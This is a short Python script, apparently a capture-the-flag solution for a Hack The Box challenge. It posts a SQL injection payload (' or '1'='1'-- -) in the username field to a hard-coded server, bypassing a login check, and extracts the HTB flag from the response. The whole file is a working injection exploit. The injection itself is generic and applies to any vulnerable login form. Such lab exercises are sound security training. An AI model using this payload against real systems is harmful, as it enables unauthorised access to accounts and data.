#!/usr/bin/python3

import requests

HOST, PORT = "83.136.255.40", 51745
CHALLENGE_URL = f"http://{HOST}:{PORT}"

def main():
    payload = "' or '1'='1'-- -"
    req_data = {
    "username":payload
    }

    resp = requests.post(CHALLENGE_URL, req_data)
    html = resp.text
    flag = "HTB{" + html.split("HTB{")[1].split("}")[0] + "}"
    
    print(flag)

if __name__ == "__main__":
    main()
